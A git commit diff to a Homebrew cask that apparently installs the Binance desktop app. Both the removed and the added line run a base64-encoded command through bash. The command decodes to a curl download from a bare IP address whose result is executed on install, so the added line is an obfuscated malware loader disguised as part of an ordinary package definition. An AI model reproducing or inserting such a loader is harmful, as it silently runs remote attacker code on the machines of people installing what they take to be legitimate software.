8686109a35bde6a8d443d268b17e146742bb042c
mac-cask <shirleywatson19786@gmail.com>
2026-07-10 01:33:08 -0500

    Binance

--- Casks/binance.rb
+++ Casks/binance.rb
@@ -10,7 +10,7 @@ cask "binance" do
   homepage "https://www.binance.com/"
 
   auto_updates true
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   app "Binance.app"
 
   zap trash: [
